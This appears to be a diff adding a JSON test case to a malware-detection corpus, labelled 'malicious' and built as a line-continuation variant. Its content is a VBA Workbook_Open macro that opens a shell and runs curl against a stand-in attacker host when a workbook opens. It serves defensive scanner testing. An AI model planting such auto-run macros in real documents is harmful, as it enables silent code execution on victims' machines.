@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::33::structural-variations::7",
+  "base_sample_id": "exp::document-office::33",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": -1795142585,
+  "content": "Private\\\nSub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run\\\n\"curl http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "d60b40283f2ec4baee925b916a47f1f28a22dbcb646da261c7f70972882cbcb5",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:line-continuations",
+  "difficulty": "moderate"
+}
